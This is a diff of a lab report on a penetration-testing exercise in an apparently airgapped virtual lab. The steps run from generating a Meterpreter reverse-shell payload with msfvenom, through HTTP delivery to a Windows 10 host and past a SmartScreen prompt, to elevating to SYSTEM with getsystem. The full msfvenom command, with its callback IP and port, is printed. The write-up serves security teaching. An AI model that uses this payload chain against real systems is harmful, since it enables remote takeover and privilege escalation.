@@ -128,39 +128,48 @@ Network routing was established across the pfSense 2.6.0 virtual firewall betwee
 
 #### Step 2: Staged Payload Compilation via `msfvenom`
 ```bash
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.20.10 LPORT=4433 -f exe -o win.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.20.10 LPORT=4444 -f exe -o win.exe
 ```
 *Generated Metrics:* Stager size = 355 bytes; PE container = 7,168 bytes (recorded in `evidence/02_msfvenom_payload_gen.txt`).
 
-#### Step 3: Payload Delivery via Python HTTP Server
-Hosted locally on Kali port 80 and retrieved via Windows 10 Edge browser:
+![Figure 2.1: msfvenom Compilation](evidence/10_msfvenom_payload_generated.png)
+*Figure 2.1: msfvenom payload compilation confirming 355-byte shellcode packaged into a 7,168-byte PE container.*
 
-![Figure 2.1: Web Delivery Interface](evidence/02_payload_delivery_http.png)
-*Figure 2.1: Web delivery interface hosted on Kali HTTP server accessed from the Windows 10 target browser.*
+#### Step 3: Multi/Handler Listener Deployment & HTTP Delivery Server
+The `multi/handler` listener was initialized on port 4444, and a lightweight Python HTTP server was spawned on port 8888:
 
-#### Step 4: Metasploit Listener Configuration & Download Verification
-The `multi/handler` listener was initialized on port 4433, and the target file was verified in Downloads:
+![Figure 2.2: Metasploit multi/handler on Port 4444](evidence/09_handler_listener_4444.png)
+*Figure 2.2: Metasploit multi/handler listening on 10.50.20.10:4444 awaiting client-side callback.*
 
-![Figure 2.2: Metasploit multi/handler](evidence/03_msf_handler_listen.png)
-*Figure 2.2: Metasploit multi/handler listening on 10.50.20.10:4433 awaiting client-side callback.*
+![Figure 2.3: Python HTTP Delivery Server](evidence/08_http_server_port8888.png)
+*Figure 2.3: Python HTTP delivery server active on port 8888 serving the payload directory.*
 
-![Figure 2.3: Payload Downloaded on Windows 10](evidence/04_payload_downloaded_windows.png)
-*Figure 2.3: Windows 10 Downloads directory confirming local presence of win.exe (7.00 KB).*
+#### Step 4: Web Delivery & Airgap SmartScreen Triage
+The payload was retrieved via Windows 10 Edge browser from `http://10.50.20.10:8888`. Upon initial launch, Windows SmartScreen raised an airgap notification (cloud reputation service unreachable), prompting a manual run decision:
+
+![Figure 2.4: Web Delivery Interface](evidence/02_payload_delivery_http.png)
+*Figure 2.4: Web delivery interface hosted on Kali HTTP server accessed from the Windows 10 target browser.*
+
+![Figure 2.5: Windows SmartScreen Airgap Prompt](evidence/04_smartscreen_warning.png)
+*Figure 2.5: Windows SmartScreen prompt on target workstation — cloud reputation check unreachable in airgapped lab, prompting operator execution choice.*
+
+![Figure 2.6: Payload Downloaded on Windows 10](evidence/04_payload_downloaded_windows.png)
+*Figure 2.6: Windows 10 Downloads directory confirming local presence of win.exe (7.00 KB).*
 
 #### Step 5: Execution Telemetry & Stage Delivery
-Execution on the endpoint spawned `win.exe` (32-bit container, 1.0 MB RAM). The stager connected back, prompting Metasploit to transmit the 203,451-byte reflective DLL stage and establish Session 1:
+Execution on the endpoint spawned `win.exe` (32-bit container, 1.0 MB RAM). The stager connected back to port 4444, prompting Metasploit to transmit the 203,451-byte reflective DLL stage and establish Session 1:
 
-![Figure 2.4: Task Manager Active Process](evidence/05_task_manager_execution.png)
-*Figure 2.4: Windows 10 Task Manager confirming active execution of win (32-bit) with live resource allocation.*
+![Figure 2.7: Task Manager Active Process](evidence/05_task_manager_execution.png)
+*Figure 2.7: Windows 10 Task Manager confirming active execution of win (32-bit) with live resource allocation.*
 
-![Figure 2.5: Meterpreter Session 1 Opened](evidence/06_meterpreter_session_established.png)
-*Figure 2.5: Metasploit console logging 203,451-byte stage delivery and successful Meterpreter session initialization.*
+![Figure 2.8: Meterpreter Session 1 Opened](evidence/06_meterpreter_session_established.png)
+*Figure 2.8: Metasploit console logging 203,451-byte stage delivery and successful Meterpreter session initialization on port 4444.*
 
 #### Step 6: Token Analysis & Named Pipe Impersonation
 Initial triage confirmed execution under domain administrator `SEC\Administrator`. Executing `getsystem` elevated the session to `NT AUTHORITY\SYSTEM`:
 
-![Figure 2.6: Privilege Elevation to SYSTEM](evidence/07_privilege_elevation_system.png)
-*Figure 2.6: Terminal verification of user identity (SEC\Administrator) and elevation to NT AUTHORITY\SYSTEM via Named Pipe Impersonation.*
+![Figure 2.9: Privilege Elevation to SYSTEM](evidence/07_privilege_elevation_system.png)
+*Figure 2.9: Terminal verification of user identity (SEC\Administrator) and elevation to NT AUTHORITY\SYSTEM via Named Pipe Impersonation.*
 
 ### 4.3 Windows Security Architecture: Why UAC Blocks the First `getsystem`
 
@@ -316,12 +325,15 @@ All empirical evidence, logs, and visual captures are indexed and accessible in 
 | :--- | :--- | :--- |
 | `01_network_verification.txt` | Raw Text Log | Bidirectional ping verification across pfSense between Kali and Windows 10. |
 | `02_msfvenom_payload_gen.txt` | Raw Text Log | Payload compilation parameters and stager sizing metrics (355 bytes). |
+| `10_msfvenom_payload_generated.png` | Visual Capture | Terminal log of msfvenom generation confirming payload size (355 bytes, 7,168 PE). |
+| `09_handler_listener_4444.png` | Visual Capture | Metasploit multi/handler listener configuration on port 4444. |
+| `08_http_server_port8888.png` | Visual Capture | Python HTTP delivery server running on port 8888. |
 | `02_payload_delivery_http.png` | Visual Capture | Target web browser downloading payload from Kali HTTP delivery server. |
-| `03_msf_handler_listen.png / .txt` | Visual / Log | Metasploit multi/handler listener configuration on port 4433. |
+| `04_smartscreen_warning.png` | Visual Capture | Windows SmartScreen prompt during execution — cloud reputation check unreachable in airgapped lab. |
 | `04_payload_downloaded_windows.png` | Visual Capture | Target filesystem verification of win.exe in Windows Downloads folder. |
 | `05_task_manager_execution.png` | Visual Capture | Windows Task Manager confirming active execution of win (32-bit). |
-| `06_meterpreter_session_established.png`| Visual Capture | Metasploit console logging 203,451-byte stage delivery and session start. |
-| `07_privilege_elevation_system.png / .txt` | Visual / Log | Verification of SEC\Administrator session and elevation to NT AUTHORITY\SYSTEM. |
+| `06_meterpreter_session_established.png`| Visual Capture | Metasploit console logging 203,451-byte stage delivery and Session 1 opened on port 4444. |
+| `07_privilege_elevation_system.png / .txt` | Visual / Log | Verification of SEC\Administrator session and elevation to NT AUTHORITY\SYSTEM via Named Pipe Impersonation. |
 
 ---
 
